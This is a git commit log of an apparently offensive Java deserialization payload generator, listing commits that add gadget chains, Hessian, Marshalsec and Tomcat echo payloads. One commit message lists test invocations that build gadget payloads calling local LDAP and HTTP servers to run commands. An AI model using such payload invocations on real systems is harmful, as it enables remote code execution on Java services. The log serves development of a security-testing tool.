[33mcommit 9954c524fbabfb837935e9c2b3a02986c825e644[m[33m ([m[1;36mHEAD[m[33m -> [m[1;32mmain[m[33m, [m[1;31morigin/main[m[33m)[m
Author: qi4l <nuxm771@163.com>
Date:   Mon Oct 21 15:42:03 2024 +0800

    fix(HTTPServer.java): Bug fixes 4

[33mcommit 928aad35942f74f29590b39bfcad02936a5bc96f[m
Author: qi4l <nuxm771@163.com>
Date:   Mon Oct 21 15:34:52 2024 +0800

    fix(HTTPServer.java): Bug fixes 3

[33mcommit 0666aa053d7773862415a91e913c0a32ef70d5c6[m
Author: Your Name <you@example.com>
Date:   Mon Oct 21 15:32:03 2024 +0800

    fix(HTTPServer.java): Bug fixes 2

[33mcommit 192a0ac085a14a67b968070849a75c8ce4c6813a[m
Author: Your Name <you@example.com>
Date:   Mon Oct 21 15:29:04 2024 +0800

    fix(HTTPServer.java): Bug fixes

[33mcommit 24e28456895d737eb844e55c071e9a13278937d4[m[33m ([m[1;33mtag: [m[1;33mv1.3.4[m[33m)[m
Author: qi4L <nuxm771@163.com>
Date:   Mon Sep 16 17:24:03 2024 +0800

    feat: add Marshalsec output

[33mcommit 11a3fc898c0a7179896d232a9f09ce6f1256b4bb[m
Author: qi4L <nuxm771@163.com>
Date:   Sun Sep 15 18:13:58 2024 +0800

    docs: update README.md 4

[33mcommit f892540164e99f08b69916afc576205a7f1b8c51[m
Author: qi4L <nuxm771@163.com>
Date:   Sun Sep 15 18:12:15 2024 +0800

    docs: update README.md 2

[33mcommit 5c2c1a86dbbeb2effa2f98f735c3116010ff1716[m
Merge: 95adfbb 983c9e1
Author: 炁 <75202638+qi4L@users.noreply.github.com>
Date:   Sun Sep 15 16:44:46 2024 +0800

    Merge pull request #57 from Lya0/marshalsec
    
    增加Marshalsec output

[33mcommit 983c9e10550c3c7b5e04f6d7837eb8dc543a839a[m
Author: Lya0 <154341443+Lya0@users.noreply.github.com>
Date:   Sun Sep 15 16:37:10 2024 +0800

    Update build.gradle

[33mcommit eed218cc0c287e51fdd226b1adfc1e600fdecf21[m
Author: Lya0 <154341443+Lya0@users.noreply.github.com>
Date:   Sun Sep 15 16:30:26 2024 +0800

    增加 marshalsec 的output
    
    一些测试用例
    -y -g SpringAbstractBeanFactoryPointcutAdvisor -p ldap://127.0.0.1:1389/Deserialization/CommonsCollections5/command/Base64/b3BlbiAv -kryo
    -y -g JdbcRowSet -p ldap://127.0.0.1:1389/Deserialization/CommonsCollections5/command/Base64/b3BlbiAv  -jk
    -y -g JdbcRowSet -p ldap://127.0.0.1:1389/Deserialization/CommonsCollections5/command/Base64/b3BlbiAv  -jy
    -y -g C3P0RefDataSource  -p ldap://127.0.0.1:1389/Deserialization/CommonsCollections5/command/Base64/b3BlbiAv -jy
    -y -g XBean  -p http://127.0.0.1:8080/ExecObject -js
    -y -g LazySearchEnumeration  -p http://127.0.0.1:8080/ExecObject -js
    -y -g Resin  -p http://127.0.0.1:8080/ExecObject -js
    -y -g Groovy  -p /usr/bin/gedit -js
    -y -g SpringAbstractBeanFactoryPointcutAdvisor  -p ldap://127.0.0.1:1389/Deserialization/CommonsCollections5/command/Base64/b3BlbiAv -js
    -y -g Rome  -p /usr/bin/gedit -js
    -y -g SpringAbstractBeanFactoryPointcutAdvisor  -p ldap://127.0.0.1:1389/Deserialization/CommonsCollections5/command/Base64/b3BlbiAv -ca
    -y -g C3P0WrapperConnPool -p http://127.0.0.1:8000/exp -ca
    -y -g JdbcRowSet -p ldap://127.0.0.1:1389/Deserialization/CommonsCollections5/command/Base64/b3BlbiAv  -jk
    -y -g C3P0RefDataSource  -p ldap://127.0.0.1:1389/Deserialization/CommonsCollections5/command/Base64/b3BlbiAv -jk
    -y -g C3P0WrapperConnPool -p http://127.0.0.1:8000/exp -jk
    -y -g SpringAbstractBeanFactoryPointcutAdvisor -p 'ldap://127.0.0.1:1389/Deserialization/CommonsCollections5/command/Base64/b3BlbiAv'  -jk
    -y -g SpringPropertyPathFactory -p 'ldap://127.0.0.1:1389/Deserialization/CommonsCollections5/command/Base64/b3BlbiAv'  -jk

[33mcommit 95adfbb45c2ee58f0d0102de9173d617857943ea[m
Author: qi4L <nuxm771@163.com>
Date:   Sun Sep 15 13:42:27 2024 +0800

    fix(Gadgets.java): _name Repair

[33mcommit 015ff5f2ae79b86a9adfb5051d24fb28bb448609[m
Author: qi4L <nuxm771@163.com>
Date:   Sun Sep 15 13:38:16 2024 +0800

    docs: updata README.md 1

[33mcommit 6ff3788b4dcd2934553eabc6e9396ae54f547539[m
Author: qi4L <nuxm771@163.com>
Date:   Fri Sep 13 11:19:35 2024 +0800

    perf: remove out

[33mcommit 777f8d1a21d7047915550eae681ede51a7ef2a75[m
Author: qi4L <nuxm771@163.com>
Date:   Fri Sep 13 11:17:00 2024 +0800

    perf: remove gradle

[33mcommit fc1dbad0020ec0eb2789c2c23211916118359d12[m[33m ([m[1;32mmaster[m[33m)[m
Author: qi4L <nuxm771@163.com>
Date:   Thu Sep 12 16:06:25 2024 +0800

    fixed untracked files

[33mcommit 4422693e1254c33dae633c3ed5d93323e3b92d94[m
Author: qi4L <nuxm771@163.com>
Date:   Thu Sep 12 15:59:39 2024 +0800

    feat: add gitignore file

[33mcommit 084a09e012e2c64bc0bcf602d7dbc62818015a72[m
Author: qi4L <nuxm771@163.com>
Date:   Wed Sep 11 18:01:46 2024 +0800

    perf: remove .idea and .gradle+

[33mcommit 05eaceb155c00ef1b26005e5ff5a0c0b56847981[m
Author: qi4L <nuxm771@163.com>
Date:   Wed Sep 11 17:55:38 2024 +0800

    perf: remove .idea and .gradle

[33mcommit 3f7148f93c30f09fc3dcaef8743b9d105d4665d6[m
Author: qi4L <nuxm771@163.com>
Date:   Wed Sep 11 10:53:30 2024 +0800

    perf(Starter.java): remove author

[33mcommit 8b502cb4724319db7bd7f36874735eefb61ba241[m
Author: qi4L <nuxm771@163.com>
Date:   Wed Sep 11 10:49:32 2024 +0800

    feat(Starter.java): add author

[33mcommit 33cc64d0ad0ec34ecdae5693077efc161da81a76[m
Author: qi4L <nuxm771@163.com>
Date:   Wed Sep 11 10:47:46 2024 +0800

    feat(Starter.java): add logo

[33mcommit a6bbe67d9eca4e2e956c8abae09578dba90d8bb4[m
Author: qi4L <nuxm771@163.com>
Date:   Wed Sep 11 10:46:10 2024 +0800

    feat(qscan.go): add logo

[33mcommit 54e5de4b0af1908091444b0c5fe69ddc69eccdae[m
Author: qi4L <nuxm771@163.com>
Date:   Mon Sep 9 22:32:17 2024 +0800

    +BUG

[33mcommit 99a640249facdd32aad839f8372593644e98e789[m
Author: qi4L <nuxm771@163.com>
Date:   Sun Sep 1 11:21:06 2024 +0800

    add ldaps++

[33mcommit 05a86ce158d712a6a61ad01d10d593541de0225b[m
Author: qi4L <nuxm771@163.com>
Date:   Sun Sep 1 11:07:55 2024 +0800

    add ldaps

[33mcommit ef963e85684467ed9683275ced56f2dee9ce1e68[m[33m ([m[1;33mtag: [m[1;33mv1.3.3[m[33m)[m
Author: qi4L <nuxm771@163.com>
Date:   Mon Aug 26 12:34:42 2024 +0800

    ++++3

[33mcommit 023319c8645c060cbe067c7c9c34a2e3b549f7fc[m
Author: qi4L <nuxm771@163.com>
Date:   Mon Aug 26 12:29:48 2024 +0800

    ++++2

[33mcommit 48c03d08df59072ad752e485ed330926603b27d3[m
Author: qi4L <nuxm771@163.com>
Date:   Mon Aug 26 12:10:08 2024 +0800

    ++++1

[33mcommit 1af4889b927b5bf56d09641486fcb552054f31dc[m
Merge: b0f7a7c f96a58d
Author: 炁 <75202638+qi4L@users.noreply.github.com>
Date:   Mon Aug 26 11:39:36 2024 +0800

    Merge pull request #53 from springkill/master
    
    add XStream suggestion

[33mcommit b0f7a7c30924cd3bc82d5dfc2d1b0365eab6f54c[m
Merge: 4bcce87 3b84752
Author: 炁 <75202638+qi4L@users.noreply.github.com>
Date:   Mon Aug 26 11:39:20 2024 +0800

    Merge pull request #54 from unam4/7gadget
    
    add 7 gadget (原生tostring）

[33mcommit 3b84752c20336aa404f6c864b34c58afee622878[m
Author: Fw-fW-fw <136979459@qq.com>
Date:   Mon Aug 19 22:48:39 2024 +0800

    add Hibernate3JDBC (org.hibernate<=4.12可用)

[33mcommit 2288a5eb859606e84d71802f4c2a57ccb2e81fda[m
Author: Fw-fW-fw <136979459@qq.com>
Date:   Mon Aug 19 22:42:26 2024 +0800

    add Hibernate3JDBC (org.hibernate<=4.12可用)

[33mcommit 5633bb5095d5615322b382a86be3d7b6ed1c9f47[m
Author: Fw-fW-fw <136979459@qq.com>
Date:   Mon Aug 19 22:32:59 2024 +0800

    add Hibernate3JDBC (org.hibernate<=4.12可用)

[33mcommit 9f7788de7c8255a7049dfff1b005640977f8f444[m
Author: Fw-fW-fw <136979459@qq.com>
Date:   Mon Aug 19 19:13:07 2024 +0800

    删除 gradle

[33mcommit 53ee3c3311737e5262a6aaf47b413f425584f7f5[m
Author: Fw-fW-fw <136979459@qq.com>
Date:   Mon Aug 19 19:10:30 2024 +0800

    groovy2 gadget反序列时触发，方便组合

[33mcommit 9db31149d041b78a0665d8a22f93e803eb482c89[m
Author: Fw-fW-fw <136979459@qq.com>
Date:   Mon Aug 19 19:06:59 2024 +0800

    groovy2 gadget反序列时触发，方便组合

[33mcommit 7d7128b4db8ca86763e63cc942ce5ec0166efc62[m
Author: Fw-fW-fw <136979459@qq.com>
Date:   Mon Aug 19 18:58:51 2024 +0800

    add  7gadgets  (降级groovyt适配新gadget)

[33mcommit 5c766bfbf874da8c9ec144f41fd883b8abe7a9e0[m
Author: Fw-fW-fw <136979459@qq.com>
Date:   Fri Aug 16 22:58:15 2024 +0800

    add  7gadgets  (降级groovyt适配新gadget)

[33mcommit f96a58d292b9bfdcba96994b9d9f0f99b76c3959[m
Author: springkill <zzz.love.study@gmail.com>
Date:   Fri Aug 16 22:46:59 2024 +0800

    edit description.

[33mcommit 115548a2d6c7a746d2767629df5f40e863285b16[m
Author: Fw-fW-fw <136979459@qq.com>
Date:   Fri Aug 16 22:42:49 2024 +0800

    add  7gadgets  (降级groovyt,hibernate适配新gadget)

[33mcommit 4cf43d62604999a11250797d8edc23bf2046f5dc[m
Author: springkill <zzz.love.study@gmail.com>
Date:   Fri Aug 16 21:29:12 2024 +0800

    Support xstream

[33mcommit 5f37ed1abc4a6c0e0aa3e5534ce8a00aca1bac77[m
Author: Fw-fW-fw <136979459@qq.com>
Date:   Fri Aug 16 21:05:10 2024 +0800

    add  7gadgets  (降级groovyt,hibernate适配新gadget)

[33mcommit a3999b8186f439c167deffa25cc767f36602b79a[m
Author: Fw-fW-fw <136979459@qq.com>
Date:   Fri Aug 16 21:03:29 2024 +0800

    add  7gadgets  (降级groovyt,hibernate适配新gadget)

[33mcommit 4bcce8789f36d34ef0bff2021f5a5b98064639ce[m
Author: qi4L <nuxm771@163.com>
Date:   Tue Aug 13 18:43:58 2024 +0800

    base64编码输出Payload

[33mcommit 993a9238289aa672b26ae22f70a6920acd88e212[m
Author: qi4L <nuxm771@163.com>
Date:   Tue Aug 13 10:52:53 2024 +0800

    修复hessian

[33mcommit ff8fe79cb776edc5fa49bc133c74d7182641a12b[m
Author: qi4L <nuxm771@163.com>
Date:   Sun Aug 4 14:58:13 2024 +0800

    hessian类型的Payload

[33mcommit 8e10aeacc12c0d2c8e1a641e0ab9e64f57593569[m
Author: qi4L <nuxm771@163.com>
Date:   Sun Aug 4 14:55:22 2024 +0800

    hessian类型的Payload

[33mcommit 5084a9b89c27d54c7e544b75cc79645bebc52c9f[m
Merge: e7b282c 5b7ebf3
Author: 炁 <75202638+qi4L@users.noreply.github.com>
Date:   Fri Aug 2 10:36:53 2024 +0800

    Merge pull request #50 from springkill/master
    
    Add Gadgets

[33mcommit 5b7ebf3833d4b6e71e64f62599f4ee95ada72f08[m
Author: springkill <zzz.love.study@gmail.com>
Date:   Fri Aug 2 09:58:53 2024 +0800

    Add Gadgets

[33mcommit e7b282c231af643e195557f2d8c95b3f96cdfdbf[m
Author: qi4L <nuxm771@163.com>
Date:   Sat Jul 27 15:56:38 2024 +0800

    Increase CC13

[33mcommit 27d53bc1316b681d86435ecfee2b04c9e837e107[m[33m ([m[1;33mtag: [m[1;33mv1.3.2[m[33m)[m
Author: qi4L <nuxm771@163.com>
Date:   Wed Jul 24 15:38:01 2024 +0800

    修复 Exploit

[33mcommit 72a91dd13f88c89cd278906a62f9de10f9e2412a[m[33m ([m[1;33mtag: [m[1;33mv1.3.1[m[33m)[m
Author: qi4L <nuxm771@163.com>
Date:   Wed May 29 16:13:04 2024 +0800

    Add constructor

[33mcommit 751035cd18302a659773be298580824da27d8984[m
Author: qi4L <nuxm771@163.com>
Date:   Thu May 23 17:41:32 2024 +0800

    重写TomcatEchoJndi +

[33mcommit 114eadcb13df2f3c5fb483cd8b768a11e6632a43[m
Author: qi4L <nuxm771@163.com>
Date:   Thu May 23 17:41:09 2024 +0800

    重写TomcatEchoJndi

[33mcommit 521973522bb3c106fa1a82059ee1ca4b7914c644[m
Author: qi4L <nuxm771@163.com>
Date:   Sun May 19 18:26:07 2024 +0800

    re README +++4

[33mcommit 9a4d7452e5353e1947cb1c78223b85803b3ffe87[m
Author: qi4L <nuxm771@163.com>
Date:   Thu May 16 17:29:46 2024 +0800

    re README +++4

[33mcommit da95355f30f1506e843531680bf997a399953fe9[m
Author: qi4L <nuxm771@163.com>
Date:   Thu May 16 17:28:33 2024 +0800

    re README +++3

[33mcommit 8bb2c43d3b5ba92621b35778fcb90c3f05ddfabd[m
Author: qi4L <nuxm771@163.com>
Date:   Thu May 16 16:23:12 2024 +0800

    tomcat修复

[33mcommit 5e7792ed58f3cfb135499e7da6aafe9a57d19fe3[m[33m ([m[1;33mtag: [m[1;33mv1.3.0[m[33m)[m
Author: qi4L <nuxm771@163.com>
Date:   Thu May 16 11:25:03 2024 +0800

    re README +++2

[33mcommit 2302b0d48edfd9eec71a8c57dc4545585f22593b[m
Author: qi4L <nuxm771@163.com>
Date:   Thu May 16 11:01:45 2024 +0800

    + TomcatJdbcController

[33mcommit cc44392dddf96c29f89174151d0659e0fc700db5[m
Author: qi4L <nuxm771@163.com>
Date:   Tue May 14 18:05:39 2024 +0800

    msf+

[33mcommit fed704fe8cd041c2e6703120c36bc672c2584f89[m
Author: qi4L <nuxm771@163.com>
Date:   Tue May 14 17:55:44 2024 +0800

    re out

[33mcommit 15bfe30f23cdcb33534bf3fc161a612479786d60[m
Author: qi4L <nuxm771@163.com>
Date:   Tue May 14 17:54:33 2024 +0800

    msf

[33mcommit c3eb683011a75309251e355c16fd9ba0b11ee22c[m
Author: qi4L <nuxm771@163.com>
Date:   Tue May 14 17:11:22 2024 +0800

    re libs

[33mcommit 1c84f63e00620b792462db9bef82673f8cd4d165[m
Author: qi4L <nuxm771@163.com>
Date:   Mon May 13 09:32:44 2024 +0800

    re README +++1

[33mcommit 5f3699453c109834438ac08b99b84e14d0384347[m
Author: qi4L <nuxm771@163.com>
Date:   Mon May 13 09:31:21 2024 +0800

    re README +++

[33mcommit ec22786847b72df212179377bafb1882d007e99c[m
Author: qi4L <nuxm771@163.com>
Date:   Tue Apr 30 14:44:03 2024 +0800

    + cb161

[33mcommit 638f8b29ed8708228d05fa905c1318a1bf7aa06f[m
Author: qi4L <nuxm771@163.com>
Date:   Mon Apr 29 16:38:43 2024 +0800

    de Authors

[33mcommit 51c0929d3d3dba39348b3c193c675d9c0f1985f8[m
Author: qi4L <nuxm771@163.com>
Date:   Mon Apr 29 16:38:17 2024 +0800

    de Authors

[33mcommit 07703764afd0bf2baab23c4772128ca0e2199348[m[33m ([m[1;33mtag: [m[1;33mv1.2.9[m[33m)[m
Author: qi4L <nuxm771@163.com>
Date:   Mon Apr 29 15:10:38 2024 +0800

    cb5

[33mcommit 0f6470d8ab2dec7c6adfcc221b0f13e64d762a59[m
Author: qi4L <nuxm771@163.com>
Date:   Sun Apr 28 18:08:45 2024 +0800

    de lib

[33mcommit b7fbbbccccd348bc398c5716562fef1f250f10cb[m
Author: qi4L <nuxm771@163.com>
Date:   Sun Apr 28 17:57:51 2024 +0800

    re logo

[33mcommit ed850448fb05925192a929e549834172d47ab5f0[m
Author: qi4L <nuxm771@163.com>
Date:   Sat Apr 27 20:46:34 2024 +0800

    lib

[33mcommit 632cabb886753594f5fdbf16a2a13555a13cfce2[m
Author: qi4L <nuxm771@163.com>
Date:   Wed Apr 3 11:48:27 2024 +0800

    re -

[33mcommit 979302205a4399f505806725206bdb01e132a4d0[m
Author: qi4L <nuxm771@163.com>
Date:   Tue Apr 2 17:13:49 2024 +0800

    re+1+

[33mcommit 130d67f3efed5d9116bf8199549b61cad20c71c5[m
Author: qi4L <nuxm771@163.com>
Date:   Tue Apr 2 17:04:39 2024 +0800

    gradle++1
